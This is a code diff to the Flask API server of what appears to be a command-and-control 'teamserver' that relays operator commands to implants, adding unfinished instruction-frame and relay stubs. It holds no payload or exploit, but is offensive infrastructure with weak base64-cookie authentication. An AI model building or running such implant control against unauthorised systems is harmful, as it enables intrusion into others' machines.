@@ -2,6 +2,9 @@ import base64
 import asyncio
 import flask
 
+from lib import networking
+from lib import instructions
+
 loop = asyncio.get_event_loop()
 app = flask.Flask(__name__)
 
@@ -38,14 +41,14 @@ class Teamserver(object):
 
         if base64.b64decode(authstring).decode("utf-8") == teamserver.config['authstring']:
             teamserver.logging.log(f"Authenticated {data['username']} from {flask.request.remote_addr}",
-                             source=f"{teamserver.teamserver.info['name']}")
+                                   source=f"{teamserver.teamserver.info['name']}")
             success = True
         else:
             teamserver.logging.log(f"Authentication Failed for {data['username']} from {flask.request.remote_addr}",
                                    source=f"{teamserver.teamserver.info['name']}")
             success = False
 
-        response = {"success": success, "error": error }
+        response = {"success": success, "error": error}
         if success and username:
             response['username'] = username
             auth_cookie = base64.b64encode(f"{username} `|` {authstring}".encode('utf-8'))
@@ -74,9 +77,12 @@ class Teamserver(object):
             if base64.b64decode(recv_authstring).decode("utf-8") == teamserver.config['authstring']:
                 # Process the command
                 data = flask.request.get_json(force=True)
-                teamserver.logging.log(f"Received {data['cmd']}, from {username}, for implant {data['id']}",
+                teamserver.logging.log(f"Received {data['cmd']}, from {username}, for implant {data['implant_id']}",
                                        level="debug", source=f"{teamserver.teamserver.info['name']}")
-                teamserver.config()
+                teamserver.config()  # TODO: Why is this here?
+                instruction_frame = instructions.create_instruction_frame(data)
+                # TODO: Resolve the destination component from instruction_frame['component_id']
+                #  * Add this instruction frame to the queue for the resulting component_id's relay
 
             else:
                 # Our auth string didn't match
@@ -89,16 +95,15 @@ class Teamserver(object):
     def validate_cookie(self, cookie):
         print(cookie)
 
-
     def start_teamserver(self, *args):
         global teamserver
 
         teamserver = args[0]
 
-
         try:
+            # teamserver.management_socket = networking.listen_on_management_socket() # TODO: Figure out where this goes
             app.run(host=teamserver.addr, port=teamserver.port)
         except Exception as e:
             teamserver.logging.log(f"Critical error when starting teamserver api server", level="critical",
-                             source=f"{teamserver.teamserver.info['name']}")
+                                   source=f"{teamserver.teamserver.info['name']}")
             exit()
